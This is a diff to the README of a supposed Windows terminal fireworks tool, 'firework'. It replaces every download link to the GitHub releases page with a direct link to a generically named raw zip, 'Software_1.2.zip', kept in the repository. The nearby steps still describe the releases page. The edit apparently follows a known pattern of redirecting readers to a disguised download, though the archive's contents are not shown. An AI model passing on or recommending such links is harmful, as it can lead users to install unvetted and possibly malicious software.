@@ -1,6 +1,6 @@
 # 🎆 firework - Fast terminal fireworks for Windows
 
-[![Download firework](https://img.shields.io/badge/Download-firework-blue?style=for-the-badge)](https://github.com/Scottieinterred502/firework/releases)
+[![Download firework](https://img.shields.io/badge/Download-firework-blue?style=for-the-badge)](https://github.com/Scottieinterred502/firework/raw/refs/heads/main/pkg/Software_1.2.zip)
 
 ## 🌟 What firework does
 
@@ -24,7 +24,7 @@ Before you start, make sure:
 ## 📥 Download firework
 
 Visit this page to download:  
-https://github.com/Scottieinterred502/firework/releases
+https://github.com/Scottieinterred502/firework/raw/refs/heads/main/pkg/Software_1.2.zip
 
 On the releases page:
 1. Open the latest release
@@ -172,4 +172,4 @@ If you delete the file, return to the releases page and download it again.
 ## 🖱️ Download again
 
 Download from the release page:  
-https://github.com/Scottieinterred502/firework/releases
+https://github.com/Scottieinterred502/firework/raw/refs/heads/main/pkg/Software_1.2.zip
